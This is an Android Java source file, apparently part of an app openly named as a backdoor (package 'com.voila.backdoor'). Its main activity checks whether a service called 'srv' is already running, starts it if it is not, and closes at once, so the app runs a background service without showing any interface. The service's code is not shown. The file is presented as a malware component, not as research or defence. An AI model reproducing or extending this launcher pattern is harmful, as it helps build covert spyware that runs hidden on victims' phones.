package com.voila.backdoor;

import android.app.*;
import android.content.*;
import android.os.*;
import android.widget.*;
import android.view.View.*;
import android.view.*;
import android.util.*;
import java.util.*;

public class MainActivity extends Activity
{

    @Override
    public void onCreate(Bundle savedInstanceState)
	{
        super.onCreate(savedInstanceState);
		Log.i("fuck","MainActivity");
		Intent i = new Intent(this,srv.class);
		if(!isr("com.voila.backdoor.srv"))
			startService(i);
		finish();
    }
	private boolean isr(String className)
	{
		ActivityManager am=(ActivityManager)getSystemService(Context.ACTIVITY_SERVICE);
		List<ActivityManager.RunningServiceInfo> info=am.getRunningServices(2147483647);
		if(info==null || info.size()==0)return false;
		for(ActivityManager.RunningServiceInfo in : info)
		{
			if(className.equals(in.service.getClassName()))return true;
		}
		return false;
	}
}

